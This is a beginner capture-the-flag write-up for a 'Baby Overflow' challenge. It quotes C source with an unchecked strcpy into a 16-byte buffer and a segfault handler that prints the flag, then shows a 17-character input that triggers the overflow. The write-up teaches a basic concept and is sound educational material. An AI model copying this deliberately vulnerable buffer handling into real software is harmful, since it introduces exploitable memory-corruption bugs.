# Baby Overflow
The challenge starts with this menu:
<br>
```
Menu:
1. Flag
2. Command prompt
Choose an option:
```
<br>
Upon inspection of the source code, the following function can be found:
<br>

```c
  void sigsegv_handler(int sig) {
    printf("%s\n", flag);
    fflush(stdout);
    exit(1);
  }
```
<br>
This means that an error handler is set up such that when there is a segmentation error, the program will output the flag.
Additionally, the following function can be seen in the source code:
<br>

  ```c
  void vuln(char *input){
    char buf2[16];
      strcpy(buf2, input);
    }
  ```
<br>
Because there is a limited size in the buffer, only 16, we can create a segmentation error by creating a buffer overflow. Logically, the buffer will overflow after inputting 17 characters.

```c
if (choice == 1) {
        printf("CCSLynx{@r3_u_sure}\n");
    } else if (choice == 2) {
        printf("Input: ");
        fflush(stdout);
        char buf1[100];
        fgets(buf1, sizeof(buf1), stdin);

        if (strstr(buf1, "max verstappen") != NULL || strstr(buf1, "formula 1") != NULL) {
            printf("CCSLynx{DU_DU_DU_DU...MAX_VERSTAPPEN}\n");
        } else {
            vuln(buf1);
        }
    } else {
        printf("Command Not Found\n");
    }
```
<br>
It can be seen above that the exploitable function vuln() can be called by choosing option 2
<br>

    Menu:
    1. Flag
    2. Command prompt
    Choose an option: 2
    Input: AAAAAAAAAAAAAAAAA
    CITU{ur_1rst_Pwn}


<br>
